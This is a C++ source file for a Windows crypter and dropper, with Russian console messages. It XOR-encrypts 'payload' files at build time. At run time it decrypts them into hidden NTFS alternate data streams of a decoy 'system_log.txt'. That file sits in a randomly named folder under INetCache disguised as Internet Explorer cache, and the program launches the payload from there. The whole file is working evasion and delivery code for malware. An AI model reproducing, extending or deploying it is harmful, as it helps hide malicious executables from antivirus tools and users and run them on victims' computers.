#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <random>

#pragma warning(disable : 4996)
namespace fs = std::filesystem;

using std::ifstream;
using std::ofstream;
using std::string;
using std::wstring;
using std::vector;
using std::wcout;

namespace CryptInstaller {

    namespace Path {
        wstring GetPathW(wstring path) {
            vector<wchar_t> pathBuf(MAX_PATH);
            GetModuleFileNameW(nullptr, pathBuf.data(), MAX_PATH);
            return fs::path(pathBuf.data()).parent_path().wstring() + L"\\" + path;
        }

        string GetPath(string path) {
            vector<char> pathBuf(MAX_PATH);
            GetModuleFileNameA(nullptr, pathBuf.data(), MAX_PATH);
            return fs::path(pathBuf.data()).parent_path().string() + "\\" + path;
        }
    }

    string getRandStr(size_t length = 20) {
        const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        std::default_random_engine rng(std::random_device{}());
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        string str;
        for (size_t i = 0; i < length; i++) str += charset[dist(rng)];
        return str;
    }

    namespace Crypt {
        class FileCryptor {
            size_t key_pos = 0;
            vector<char> key;
        public:
            FileCryptor(vector<char> _key) : key(_key) {}
            vector<char> process(const vector<char>& mess) {
                vector<char> result;
                result.reserve(mess.size());
                for (size_t i = 0; i < mess.size(); i++) {
                    if (key_pos >= key.size()) key_pos = 0;
                    result.push_back(mess[i] ^ key[key_pos]);
                    key_pos++;
                }
                return result;
            }
        };

        void processFile(ifstream& in, ofstream& out, vector<char> key) {
            in.seekg(0, std::ios::end);
            size_t size = in.tellg();
            in.seekg(0, std::ios::beg);

            vector<char> buff(size);
            in.read(buff.data(), size);

            FileCryptor crypt(key);
            vector<char> output = crypt.process(buff);

            out.write(output.data(), output.size());
            wcout << L"    Обработано байт: " << std::to_wstring(size) << L"\n";
        }

        vector<char> decryptToMem(ifstream& in, vector<char> key) {
            in.seekg(0, std::ios::end);
            size_t size = in.tellg();
            in.seekg(0, std::ios::beg);

            vector<char> buff(size);
            in.read(buff.data(), size);

            FileCryptor crypt(key);
            return crypt.process(buff);
        }

        vector<char> getKey() {
            ifstream fkey(Path::GetPath("KEY-DO-NOT-REMOVE.key"), std::ios::binary);
            if (!fkey.is_open()) return {};

            vector<char> key;
            vector<char> buff(128);
            for (size_t i = 0; i < 32; i++) {
                fkey.read(buff.data(), 128);
                key.insert(key.end(), buff.begin(), buff.end());
                fkey.ignore(1);
            }
            return key;
        }
    }

    void generateKey() {
        ofstream key(Path::GetPathW(L"KEY-DO-NOT-REMOVE.key"), std::ios::binary);
        std::default_random_engine rng(std::random_device{}());
        std::uniform_int_distribution<int> dist(0xA0, 0xFF);

        vector<char> buff(128);
        for (size_t i = 0; i < 32; i++) {
            for (size_t j = 0; j < 128; j++) buff[j] = (char)dist(rng);
            key.write(buff.data(), 128);
            key.write("\n", 1);
        }
        wcout << L"[+] Ключ успешно сгенерирован!\n";
    }

    void build(wchar_t* curr_path) {
        wcout << L"[*] Читаю ключ...\n";
        vector<char> key = Crypt::getKey();
        if (key.empty()) { wcout << L"[!] Ошибка: Ключ не найден!\n"; return; }

        CreateDirectoryW(Path::GetPathW(L"build\\").c_str(), NULL);
        CreateDirectoryW(Path::GetPathW(L"build\\data\\").c_str(), NULL);

        wcout << L"[*] Подготовка окружения...\n";
        fs::copy(curr_path, Path::GetPathW(L"build\\" + fs::path(curr_path).filename().wstring()), fs::copy_options::overwrite_existing);
        fs::copy(Path::GetPathW(L"KEY-DO-NOT-REMOVE.key"), Path::GetPathW(L"build\\KEY-DO-NOT-REMOVE.key"), fs::copy_options::overwrite_existing);

        wcout << L"[*] Шифрую файлы полезной нагрузки...\n";
        for (auto& p : fs::directory_iterator{ Path::GetPathW(L"src\\") }) {
            ifstream in(p.path().string(), std::ios::binary);
            ofstream out(Path::GetPath("build\\data\\" + p.path().filename().string() + ".encrypted"), std::ios::binary);
            Crypt::processFile(in, out, key);
        }

        ifstream sp(Path::GetPath("START-PATH-DO-NOT-REMOVE.pth"), std::ios::binary);
        ofstream osp(Path::GetPath("build\\START-PATH-DO-NOT-REMOVE.pth.encrypted"), std::ios::binary);
        Crypt::processFile(sp, osp, key);

        wcout << L"[+] Сборка успешно завершена!\n";
    }

    void execute() {
        if (!fs::exists(Path::GetPathW(L"data\\"))) {
            MessageBoxW(GetConsoleWindow(), L"Компилируемые файлы не найдены!", L"Ошибка", MB_OK | MB_ICONERROR);
            return;
        }

        vector<char> key = Crypt::getKey();
        if (key.empty()) return;

        string basePath = string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Windows\\INetCache\\IE_" + getRandStr(8) + "\\";
        CreateDirectoryA(basePath.c_str(), NULL);

        string carrierFile = basePath + "system_log.txt";
        ofstream dummy(carrierFile);
        dummy << "System Cache Log\nStatus: OK\nLast Check: 0x00000000";
        dummy.close();

        for (auto& p : fs::directory_iterator{ Path::GetPathW(L"data\\") }) {
            ifstream ff(p.path().string(), std::ios::binary);

            string originalName = p.path().filename().string();
            string fname = originalName.substr(0, originalName.rfind(".encrypted"));

            string streamPath = carrierFile + ":" + fname;
            ofstream of(streamPath, std::ios::binary);
            Crypt::processFile(ff, of, key);
        }

        ifstream sp(Path::GetPath("START-PATH-DO-NOT-REMOVE.pth.encrypted"), std::ios::binary);
        vector<char> ipbuff = Crypt::decryptToMem(sp, key);
        string startFile(ipbuff.begin(), ipbuff.end());

        string targetExe = carrierFile + ":" + startFile;

        SetEnvironmentVariableA("KCL_CORE_INIT", "0x8A");

        char* cmdline = new char[targetExe.size() + 3];
        strcpy(cmdline, ("\"" + targetExe + "\"").c_str());

        STARTUPINFOA si{ sizeof(si) };
        PROCESS_INFORMATION pi{};

        si.lpTitle = (LPSTR)"KCL";

        if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        delete[] cmdline;
    }
}

int wmain(int argc, wchar_t* argv[])
{
    setlocale(LC_ALL, "ru-RU.UTF-8");

    if (argc > 1 && wcscmp(argv[1], L"--gen-key") == 0) {
        CryptInstaller::generateKey();
        wcout << L"Нажмите Enter для выхода..."; std::cin.get();
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"--build") == 0) {
        CryptInstaller::build(argv[0]);
        wcout << L"Нажмите Enter для выхода..."; std::cin.get();
        return 0;
    }

    CryptInstaller::execute();
    return 0;
}